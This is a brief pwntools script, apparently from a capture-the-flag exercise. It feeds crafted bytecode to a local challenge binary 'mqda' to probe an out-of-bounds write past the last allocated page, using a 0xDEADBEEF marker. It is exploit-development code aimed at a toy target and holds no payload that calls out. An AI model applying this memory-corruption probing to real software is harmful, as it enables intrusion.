#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def main():
    # Test with fewer pages to stay under instruction limit
    # We have 511 instruction limit
    # Each page alloc = 3 instructions (mov, mov, push)
    # 511 / 3 = 170 pages max
    
    code = b''
    for i in range(100):  # 100 pages = 300 instructions
        addr = i * 0x100
        code += mov_reg_imm(15, addr)
        code += mov_reg_imm(0, 0x41414141 + i)
        code += push_reg(0)
    
    # OOB write from last page
    code += mov_reg_imm(15, 99 * 0x100 + 0xFF)
    code += mov_reg_imm(0, 0xDEADBEEF)
    code += push_reg(0)
    
    code += hlt()
    
    print(f"[*] Code length: {len(code)}, ~{len(code)//14 * 3 + 4} instructions")
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=5)
    print(f"[*] Output: {output}")
    p.close()

if __name__ == '__main__':
    main()
